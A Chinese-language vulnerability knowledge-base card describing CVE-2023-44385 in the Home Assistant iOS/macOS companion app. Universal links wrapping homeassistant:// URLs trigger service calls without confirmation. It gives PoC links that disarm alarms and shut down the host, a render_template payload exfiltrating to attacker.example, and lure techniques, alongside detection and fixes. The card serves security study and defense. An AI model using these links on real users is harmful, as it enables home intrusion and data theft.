---
id: mobile-ios-url-scheme-universal-link-service-csrf
title: iOS/macOS 伴侣应用 URL scheme 服务调用伪造：https 通用链接包装 homeassistant://call_service，点链接即可解除警报或关机
type: scenario
domain: mobile
path: mobile/ios
technique: ios-url-scheme-universal-link-service-csrf
tags:
- ios
- macos
- url-scheme
- universal-link
- csrf
- shortcuts
- smart-home
- home-assistant
cve:
- CVE-2023-44385
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
affected_versions: 2023.7 之前（iOS/macOS Companion；原文：修复在 2023.7 版本发布；CVE-2023-44385）
verification:
  verified_by: verifier-V543
  verified_at: '2026-11-11T20:33:26+08:00'
  notes: 已对照原文第十一节与图09-12核对：homeassistant:// call_service/render_template、https://www.home-assistant.io/ios/?url= 通用链接包装、二维码/短链隐藏、Shortcuts App Intents、修复后 Call service? 确认框均与图文一致；CVE-2023-44385、原文时间线修复 2023.7，affected_versions 2023.7 之前正确。单点客户端请求伪造链，原子；库内 mobile/ios 无相近卡。未执行 PoC。
url: /docs/mobile/ios/mobile-ios-url-scheme-universal-link-service-csrf/
draft: false
kb_aliases:
- 客户端请求伪造
- universal link CSRF
- homeassistant://call_service
- URL scheme 滥用
- Shortcuts App Intents
- CVE-2023-44385
- Home Assistant iOS
---

## 一句话结论

iOS/macOS 伴侣应用注册的 `homeassistant://` URL handler 会直接执行 `call_service`、`render_template` 等动作，且 `https://www.home-assistant.io/ios/?url=...` 通用链接可以包装任意 `homeassistant://` 地址；攻击者分享看似正常的 https 链接或二维码，受害者点击/扫描后，已登录的应用就在无确认的情况下调用服务（如解除警报、关闭主机、渲染模板外带数据）。

## 原理

- 伴侣应用为方便自动化，支持 URL scheme 动作：`homeassistant://call_service/light.turn_on?entity_id=all`、`homeassistant://x-callback-url/call_service/...`、`homeassistant://x-callback-url/render_template?template=...&x-success=...` 等；App 收到后使用已保存的认证向 Home Assistant 服务器发起请求。
- 应用还注册了 `https://www.home-assistant.io/ios/` 通用链接，参数 `url` 可携带 `homeassistant://` 地址。于是攻击者可以分享一个域名完全合法（`www.home-assistant.io`）的 https 链接，绕过用户对陌生 scheme 的警惕。
- 点击后 App 不经确认即执行动作。原文示例包括把全家灯光打开、`alarm_control_panel.alarm_disarm` 解除警报、`hassio.host_shutdown` 关闭 Home Assistant 主机。
- `render_template` 动作可执行任意 Jinja 模板，并把结果通过 `x-success` 回调发到攻击者服务器；攻击者可先用它枚举实体 ID/区域，再构造精确的服务调用。
- 二维码场景下，iOS 相机对 Home Assistant URL 会显示黄色横幅警告，但攻击者可用短链/重定向隐藏最终 URL，使扫码器只看到普通域名，进一步降低警惕。
- Siri/Shortcuts 的 App Intents 同样能调用任意服务/渲染模板；恶意快捷方式可伪装成正常自动化分享给受害者，执行时触发动作。
- 之所以成立：URL 动作把“调用服务”的权限直接暴露给任何能投递链接/二维码/快捷方式的人，缺少用户确认与来源校验；服务调用接口本身需要认证，但 App 已持有凭证并代为发起。

## 触发条件

- 伴侣应用注册了可执行服务调用的 URL scheme/通用链接/App Intents，且不要求用户确认。
- 受害者设备上应用已登录 Home Assistant，且点击/扫描了攻击者投递的链接或二维码。
- 目标服务允许通过该入口调用（如 `light.turn_on`、`alarm_control_panel.alarm_disarm`、`hassio.host_shutdown`、`render_template`）。
- 攻击者能投递链接（聊天、邮件、二维码、快捷方式分享）。

## 利用步骤

1. 确认应用支持的 URL 动作与通用链接格式（`homeassistant://call_service/...`、`https://www.home-assistant.io/ios/?url=...`）。
2. 选择高影响服务：解除警报、关闭主机、打开门锁/车库门、调整温控、调用脚本等；先用 `render_template` 枚举实体与区域名称。
3. 构造通用链接，把 `homeassistant://` 动作放在 `url` 参数中并 URL 编码，使外观看上去是官方 https 域名。
4. 通过聊天/邮件/二维码投递，或用短链/重定向隐藏最终 URL，规避扫码器的 URL 预览警告。
5. 受害者点击/扫码后，应用携带其认证请求服务器执行动作；用 `render_template` + `x-success` 把模板结果外带到攻击者服务器验证影响。
6. 也可把动作藏在共享的 Shortcuts 快捷方式中，以“实用自动化”为名诱导执行。

## PoC

```text
# 1) 直接 scheme：打开所有灯
homeassistant://call_service/light.turn_on?entity_id=all

# 2) 通用链接包装（外观为官方 https 域名）
https://www.home-assistant.io/ios/?url=homeassistant://%2F%2Fcall_service%2Flight.turn_on%3Fentity_id%3Dall

# 3) 解除警报
https://www.home-assistant.io/ios/?url=homeassistant://call_service/alarm_control_panel.alarm_disarm

# 4) 关闭 Home Assistant 主机
https://www.home-assistant.io/ios/?url=homeassistant://call_service/hassio.host_shutdown

# 5) 模板执行并把结果外带
homeassistant://x-callback-url/render_template?x-success=https%3A%2F%2Fattacker.example%2F&template={{ ... }}
```

```text
# 预期：点击链接/扫码后，已登录的伴侣应用直接调用对应服务；
# 修复后应用弹出 "Call service? ..." 确认框，取消则不执行。
```

## 变体与关联

- 变体：`x-callback-url` 形式（`homeassistant://x-callback-url/call_service/...`）与直接路径形式等价，注意两种都测试。
- 变体：通过 HTTPS 链接/二维码/邮件/聊天投递；短链与重定向可隐藏最终 URL。
- 变体：Siri/Shortcuts App Intents 可调用任意服务或渲染模板，恶意快捷方式可伪装为正常自动化。
- 关联：[[web-generic-ssrf-hassio-addon-stdin-path-traversal-supervisor]]（本卡可作为其 CSRF 触发器，串联调用 hassio 服务）、[[web-generic-oauth-unrestricted-client-id-consent-code-theft]]（同一产品的 OAuth 钓鱼）。
- 边界：应用对 URL 动作要求确认、限制可调用服务白名单、禁止 `render_template`/`hassio` 高危服务、通用链接只允许站内路径时，本场景不成立或影响受限。

## 检测与防御

- 检测：应用侧记录 URL 动作来源与调用的服务；短时间内的异常服务调用（alarm_disarm、hassio.host_shutdown、lock/unlock）；`render_template` 携带 `x-success` 外部回调；扫描器/网关对含 `homeassistant://` 的通用链接告警。
- 修复：所有 URL 动作执行前弹出确认对话框并显示将调用的服务与实体；对高危服务（警报、门锁、关机、模板）默认禁止或要求二次认证。
- 加固：通用链接只接受白名单路径与参数；限制 `render_template` 的 `x-success` 目标域名；对 App Intents 调用同样加确认；用户教育中提醒不要点击来源不明的自动化链接/二维码。
